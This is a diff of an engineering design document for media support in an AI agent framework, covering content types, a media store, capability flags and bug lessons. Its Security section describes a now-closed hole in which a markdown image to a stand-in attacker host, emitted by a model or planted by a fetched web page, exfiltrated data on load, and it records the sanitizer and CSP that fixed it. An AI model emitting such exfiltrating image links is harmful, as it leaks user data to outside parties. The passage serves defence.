@@ -8,7 +8,8 @@ Status: **P1-P5 shipped** — content parts, the media store, tools returning
 media, providers inlining it, per-model capabilities enforced before the
 request, inbound attachments, the UI rendering and composing media behind a
 sanitizer and a CSP, and media travelling back out to Discord, Slack and the
-terminal. Only the optional P6 extras remain.
+terminal. What remains is the optional P6 extras and one known gap — see
+*What is left*.
 
 ## Where this stands
 
@@ -16,8 +17,8 @@ Written for whoever picks this up next, including a later version of the person
 who wrote it. The per-phase detail is under **Phases**; this is the short
 version plus the things that are expensive to rediscover.
 
-**Branch:** `worktree-media-support-plan`, eight implementation commits on top
-of the design ones. Nothing merged to `main` yet.
+**Branch:** `worktree-media-support-plan` — seven feature commits, one per
+phase, plus the docs. Nothing merged to `main` yet.
 
 ### Shipped
 
@@ -41,10 +42,8 @@ New modules worth knowing about: `core/src/content/{types,codec}.ts`,
 
 ### What is left
 
-**P6 — optional, and genuinely optional.** OCR degradation via the existing
-`extract_document`, iTerm2/kitty inline images, audio and video adapters, a
-resize step for models with small size caps. Nothing in P1-P5 is waiting on any
-of it.
+**P6 — optional, and genuinely optional.** Listed under *Phases*; nothing in
+P1-P5 is waiting on any of it.
 
 **Also open**, from earlier phases: the SSE `tool_result` event still truncates
 to 1000 chars at two sites (`packages/server/src/index.ts:1178` and `:2447`) and
@@ -77,19 +76,18 @@ current surfaces work, because they already do.
 - **Sanitizing URLs by scheme hits every attribute.** Blocking remote images
   through `ALLOWED_URI_REGEXP` also strips `href` from every external link. Use
   a hook that can see the tag.
-- **Find the interface production actually calls before widening one.**
-  `Channel.send` and `OutboundNotifier.send` are structurally identical, and
-  every production caller resolves through the *second* one. Widening `Channel`
-  alone would have compiled, passed, and changed nothing anywhere — a third
-  dead flag in the same workstream, and the quietest of the three. A grep for
-  `.send(` found it; reading the interface would not have.
-- **A capability the caller can't honour is worse than no capability.** Both
-  transports declared `attachments: true`, so the ladder skipped the placeholder
-  on the way to an upload that then never happened, because the deployment had
-  no media store. Media vanished silently — the one outcome this whole document
-  argues against — in the code written to prevent it. Capabilities have to
-  describe what will actually happen at the moment of use, not what the
-  transport can do in principle. Its test is what caught it.
+- **Find the interface production actually calls before widening one.** A grep
+  for `.send(` found that nothing in production holds a `Channel`; the full
+  story is under *Capabilities*.
+- **A capability the caller can't honour is worse than no capability.** Declaring
+  `attachments: true` with no media store configured made images vanish. See
+  *The capability has to be true at the moment of use*.
+- **The sweep for silent coercion is not just `${...}`.** `.join()` does it too,
+  and that is how the stall detector spent five phases comparing every
+  media-carrying tool result as `[object Object]` — so two different screenshots
+  read as no progress and the turn was cut short. Grep for `.join(`, `String(`
+  and raw `SELECT content FROM messages` as well; three more sites turned up
+  that way.
 
 ### Verify
 
@@ -99,7 +97,7 @@ pnpm run guard:local-refs && pnpm run guard:pre-v1
 npx biome check packages/    # repo-wide; a file subset misattributes blame
 ```
 
-Green as of P5b: core 3,272 · cli 224 · evals 510 · server 132 ·
+Green as of P5b: core 3,274 · cli 224 · evals 510 · server 132 ·
 trusted-actions 101 (+2 skipped) · provider-openai 83 · deploy-aws 61 ·
 provider-anthropic 52 · provider-bedrock 41 · provider-deepseek 21 · ui 19 ·
 channel-slack 17 · provider-openrouter 15 · google-tools 13 ·
@@ -230,7 +228,7 @@ conversation, which is the good version):
   base64 out of SQLite.
 - **As a text projection.** When a surface genuinely cannot show an image — a
   text-only model, a plain terminal, a log line — something has to stand in for
-  it, and `[image: chart.png 1024×768 #a1b2c3d4]` is that something.
+  it, and `[image: chart.png 1024×768 image/png #a1b2c3d4]` is that something.
 
 The rule that falls out: **a placeholder is a rendering, never a transport.** It
 is what a part looks like when flattened for a surface that can't do better, and
@@ -403,17 +401,17 @@ the compiler proves it.** Widening `Message.content` to that union and running
 news. `string` and `Array` share `.length`, `.slice`, `.indexOf`, `.includes`
 and `.at`, so the read sites silently accept an array:
 
-Line numbers in this table and the paragraph after it are **as of the pre-P1
-tree**, since that is the tree the experiment was run against. They have since
-moved; they are left as they were because renumbering them would quietly turn a
-record of a measurement into a claim about current code.
-
-| Real call site | `string \| ContentPart[]` | `string \| MessageContent` |
+| Real call site (line numbers pre-P1) | `string \| ContentPart[]` | `string \| MessageContent` |
 |---|---|---|
 | `(msg.content ?? "").length` — `estimateTokens`, `loop.ts:564` | **compiles** ⚠️ | errors ✓ |
 | `msg.content.slice(0, 300)` — trim log, `loop.ts:784` | **compiles** ⚠️ | errors ✓ |
 | `` `[${msg.role}]: ${msg.content}` `` — `compact.ts:177` | **compiles** ⚠️ | **compiles** ⚠️ |
 | assign to `string \| null` — `saveMessage`, `queries.ts:69` | errors ✓ | errors ✓ |
+
+Line numbers in that table and in the paragraph below are **as of the pre-P1
+tree**, since that is the tree the experiment ran against. They have since moved
+and are left as they were: renumbering them would quietly turn a record of a
+measurement into a claim about current code.
 
 Under the array union, `estimateTokens` would return *the number of parts*
 instead of a character count, and the compaction transcript would hand
@@ -496,11 +494,21 @@ while costing all 398 construction sites. This is the one place the "no external
 users, so break it" licence is deliberately *not* spent: the churn is large, the
 benefit is aesthetic, and `endsTurn` would have to move too.
 
-`onToolResult?: (name: string, result: string)` becomes
-`(name: string, result: string | ToolOutput)`. Seven consumers — server SSE, CLI,
-task-watcher, cron, rooms watcher, autopilot, exploratory — each break loudly
-and each has a real decision to make about rendering. That is the break working
-as intended.
+`onToolResult` was **planned to widen and deliberately did not.** The intent was
+`(name: string, result: string | ToolOutput)`, breaking its seven consumers —
+server SSE, CLI, task-watcher, cron, rooms watcher, autopilot, exploratory — so
+each would have to decide what it does about rendering.
+
+P5b removed the reason. Every surface now gets media by reading the message
+record, which is where the media already is, so widening the observer would have
+handed seven consumers a second way to learn the same fact — and a second way to
+get it wrong. The signature stays `(name, result: string)` and the callback
+passes `toolOutputText(...)`, which is honest: the observer is a *notification*
+that a tool ran, and its payload is a projection by design rather than by
+oversight.
+
+Recorded here because "we planned to break this and then didn't" is the kind of
+thing that otherwise reads as an oversight to the next person who greps for it.
 
 ### The media store
 
@@ -508,11 +516,20 @@ A seam, with a default implementation, registered like every other backend:
 
 ```ts
 export interface MediaStore {
-  put(bytes: Buffer, meta: { mimeType: string; name?: string; sessionId?: string }): Promise<MediaRef>;
+  id: string;
+  /** `mimeType` is optional — magic bytes decide when the caller cannot. */
+  put(bytes: Buffer, opts?: PutMediaOptions): Promise<MediaRef>;
   get(id: string): Promise<{ ref: MediaRef; bytes: Buffer } | undefined>;
   stat(id: string): Promise<MediaRef | undefined>;
+  delete(id: string): Promise<boolean>;
   /** For surfaces that hand out URLs rather than bytes. */
   urlFor?(id: string): string | undefined;
+  /**
+   * A path on this machine, for surfaces that can open one — the CLI's
+   * `file://` rung. Optional because an S3-backed store genuinely has none,
+   * and a fabricated path would be worse than nothing.
+   */
+  localPathFor?(ref: MediaRef): string | undefined;
 }
 ```
 
@@ -554,11 +571,25 @@ TypeError."*
 /**
  * A leaf is an object, never a bare boolean, so it can grow limits later
  * without a breaking change. `"unknown"` is distinct from `false`.
+ *
+ * Shipped as one interface with a tri-state `supported` rather than the
+ * three-arm union first drafted here. Same three states, far less ceremony at
+ * the ~40 construction sites, and the fields a `false` leaf does not use are
+ * simply absent rather than made unrepresentable — which turned out not to be
+ * worth a discriminated union nobody was narrowing on anyway.
  */
-export type Support =
-  | { supported: true; maxBytes?: number; maxItems?: number; formats?: string[] }
-  | { supported: false }
-  | { supported: "unknown" };
+export type SupportState = true | false | "unknown";
+
+export interface Support {
+  supported: SupportState;
+  maxBytes?: number;
+  maxItems?: number;
+  formats?: string[];
+}
+
+export interface ToolResultMediaSupport extends Support {
+  mode?: "inline" | "follow-up";
+}
 
 export interface ModelCapabilities {
   /** Mime types or globs accepted as input: ["text/*", "image/*"]. */
@@ -568,7 +599,9 @@ export interface ModelCapabilities {
   inputBytes: Support;
   inputUrl: Support;
   /** Media inside a tool result is its own capability, not implied by input. */
-  toolResultMedia: { supported: true; mode: "inline" | "follow-up" } | { supported: false } | { supported: "unknown" };
+  toolResultMedia: ToolResultMediaSupport;
+  /** What `supportsTools` should always have been. */
+  tools: Support;
 }
 ```
 
@@ -640,7 +673,8 @@ supportsExternalFileUrls = (id) => /(^|\/)gemini-/.test(id) && !/(^|\/)gemini-2\
 Two lessons taken: capability is **per model instance, not per provider class**,
 and making it a required member is what stops it becoming decorative. Ours is
 optional only because 6 provider packages would otherwise fail to compile on
-upgrade; the `supportsTools` rules above are what substitute for the compiler.
+upgrade; the three rules in *Not another dead flag*, below, are what substitute
+for it.
 
 Resolution order, most specific first: `ModelEntry.capabilities` in config →
 `provider.capabilities(model)` → **`"unknown"`**. `ModelEntry` already has the
@@ -682,12 +716,11 @@ export interface SurfaceCapabilities {
 keeping the copies honest. A limit is a capability, so it moved in.
 
 **Required, not optional**, and unlike `AIProvider.capabilities` this one could
-afford to be: the surface count is small and all of it is in this repo. The
-Vercel lesson applies directly — making `supportedUrls` a required member of
-`LanguageModelV4` is what stopped it becoming decorative. A surface with nothing
-to declare spreads `TEXT_ONLY_SURFACE` and is then *honestly described* rather
-than merely undescribed, and the channel contract suite asserts the struct is
-populated so a new transport cannot ship without one.
+afford to be: the surface count is small and all of it lives in this repo. That
+is the `supportedUrls` lesson from two sections up, finally taken. A surface with
+nothing to declare spreads `TEXT_ONLY_SURFACE` and is then *honestly described*
+rather than merely undescribed, and the channel contract suite asserts the struct
+is populated so a new transport cannot ship without one.
 
 It goes on **`OutboundNotifier` as well as `Channel`**, which is the part worth
 writing down. The two interfaces are structurally identical and every production
@@ -790,7 +823,8 @@ than itself.
 
 **To a surface:** inline → attachment → link → text projection. An HTML page
 gets `<img>`; Discord and Slack get a file upload; a terminal gets
-`[image: chart.png 1024×768] file:///…`; a log gets the projection alone.
+`[image: chart.png 1024×768 image/png #a1b2c3d4] file:///…`; a log gets the
+projection alone.
 
 Shipped as `renderForSurface()` in `core/src/channels/render.ts`, in **one**
 implementation that every transport calls. That is not tidiness. Three
@@ -802,8 +836,8 @@ transport cannot take the bytes without also taking the decision about what to
 do when it can't.
 
 Every rung is lossy in a different direction, so each one says what it did. A
-silently dropped image is the worst outcome available and the current behaviour
-in all four places named at the top.
+silently dropped image is the worst outcome available, and was the behaviour in
+all four places named at the top.
 
 **The rule that governs all of it: a part that does not reach the model must
 leave either a warning or a placeholder. Never nothing, and never itself.**
@@ -833,7 +867,8 @@ flattened its own way.
 ```ts
 export interface InboundMessage {
   text: string;
-  parts?: ContentPart[];
+  /** Already stored — a caller puts bytes first and passes ids. */
+  media?: MediaRef[];
 }
 export function runAgentLoop(
   userMessage: string | InboundMessage,
@@ -905,7 +940,7 @@ built the content model, the store, hydration and the capability pre-flight, and
 nothing ever instantiated a store or handed one to the loop — the whole feature
 worked only in tests. `media.*` config, `AgentRuntime.getMediaStore()` and the
 `buildLoopOptions` wiring close that. It is the same failure mode as
-`supportsTools` and it nearly shipped twice in the same workstream.
+`supportsTools`, and it is the reason `media-runtime-wiring.test.ts` exists.
 
 Still open for P5: the UI composer (file / paste / drop) and rendering media
 back out to a surface.
@@ -930,6 +965,23 @@ stripped the `href` from every external link. Remote image sources are now
 removed in a hook that can see the tag, and `https:` links work again. A link is
 navigation the user chooses; an image `src` is an automatic fetch. Only the
 second is the vector.
+
+**P5b also fixed four coercion sites P1's sweep had missed**, found by auditing
+the doc's own claims against the code rather than by anything failing. The worst
+was live and user-visible: the stall detector built its round signature with
+`results.map((r) => r.output).join("|")`, and `join` stringifies the `ToolOutput`
+arm to `[object Object]` — so every media-carrying result compared equal to
+every other, and a browser agent screenshotting two *different* pages was told it
+was making no progress and had its screenshot tool taken away. The other three:
+a rewind preview quoting encoded JSON at the user, cron pasting an encoded row
+into the next prompt, and a workflow error message reading
+`tool_call "x" failed: [object Object]`.
+
+The lesson generalizes past this codebase. P1 swept for `${...}` because that is
+the coercion everyone pictures; `.join()`, `String()`, and a raw
+`SELECT content FROM messages` are the same hazard wearing different clothes, and
+none of them is a compile error. Grep for the *operations* that coerce, not the
+syntax that usually does.
 
 **P5b — Outbound on the remaining surfaces. ✅ Shipped.** `Channel.send` and
 `OutboundNotifier.send` take `string | MessageContent`; `SurfaceCapabilities` is
@@ -968,24 +1020,34 @@ owning that guess. It is a real feature and it is P6's.
 **P6 — Optional, unscheduled.** OCR fallback; iTerm2 / kitty inline images in the
 CLI; audio and video adapters; a resize step for models with small size caps.
 
-Config (`media.retentionDays`, `media.maxBytes`, `media.onUnsupported`,
-`media.onUnknown`, `media.ocrFallback`) and per-model capability declarations
-are *tier 3* — they live in a deployment's `config.yaml`, not here.
+Config (`media.store`, `media.dir`, `media.urlBase`, `media.retentionDays`,
+`media.maxBytes`, `media.onUnsupported`, `media.onUnknown`, `media.options`) and
+per-model capability declarations are *tier 3* — they live in a deployment's
+`config.yaml`, not here. `media.ocrFallback` is named below under *Degradation*
+and does **not** exist yet; it arrives with P6's OCR rung or not at all.
 
 ## Security
 
-Media makes an existing hole load-bearing, so P5 cannot ship without closing it.
+**The hole described in the next paragraph is closed** — `dompurify` is a UI
+dependency and the server sets a CSP. Like *Why now*, the finding is kept in the
+tense it was written in, because the argument for why it had to be fixed is
+worth more than a sentence saying it was.
 
-**The UI renders model output as `marked.parse()` into
-`dangerouslySetInnerHTML`** (`MessageBubble.tsx:255`, `chips.tsx:56`) with **no
-sanitizer in any package.json** and **no CSP anywhere in the server**. So
-`![](http://attacker/?q=…)` written by a model — or by a web page a tool
-fetched — already renders today and already exfiltrates on load. This predates
+Media made an existing hole load-bearing, so P5 could not ship without closing
+it.
+
+**The UI rendered model output as `marked.parse()` into
+`dangerouslySetInnerHTML`** — in `MessageBubble.tsx` and `chips.tsx`, among six
+sites — with **no sanitizer in any package.json** and **no CSP anywhere in the
+server**. So `![](http://attacker/?q=…)` written by a model — or by a web page a
+tool fetched — already rendered, and already exfiltrated on load. That predated
 the proposal, but the proposal makes agents emit images routinely, which turns a
 latent bug into a used code path.
 
-P5 ships: a sanitizer on every `dangerouslySetInnerHTML` site, and a CSP with
-`img-src 'self' data:` so a remote image cannot phone home.
+P5a shipped: a sanitizer on every `dangerouslySetInnerHTML` site, and a CSP with
+`img-src 'self' data: blob:` so a remote image cannot phone home. `blob:` is
+there for the composer's local preview of a file the user just picked, which is
+same-origin by construction and never leaves the page.
 
 Also required:
 
@@ -1014,8 +1076,9 @@ API is the expensive one. The list below is what P1 signs up for.
 
 Written before P1 and kept in that tense: it is the prediction, and the phases
 above record what actually happened. Its line numbers are pre-P1 for the same
-reason as the table further up. Every item here has since been done except where
-the phase notes say otherwise.
+reason as the table further up. Every item here has since been done **except the
+two named under *What is left*** — the SSE truncation, and `onToolResult`, which
+was deliberately not widened once P5b removed the reason to.
 
 - **Every read of `Message.content` and `ToolResult.output`** must decide what it
   does about media. 47 `Message.content` read sites repo-wide; ~40 fail to
@@ -1091,8 +1154,11 @@ than deleted, because the answer is usually less interesting than the reason.
 - **Do rooms carry media?** `room_messages.content` is TEXT and the envelope is
   regex-parsed (`rooms/envelope.ts`). Agent-to-agent images are a real use case
   and a bigger change than it looks.
-- **Where do capability defaults come from, if not from config?** Hand-writing a
-  line per model is the thing nobody sustains. Three options, none free:
+- **Where do capability defaults come from?** The *default* half is settled:
+  `"unknown"` plus `media.onUnknown: "try"` is what shipped, and it is why an
+  undeclared vision model still gets shown pictures. What stays open is whether
+  to source real declarations from somewhere, and from where. Three options,
+  none free:
   `models.dev`'s `api.json` (`modalities: {input:[], output:[]}` per model — it
   is what LangChain's profiles are generated from, so it is already load-bearing
   for someone else); OpenRouter's `/api/v1/models`, which is live and filterable
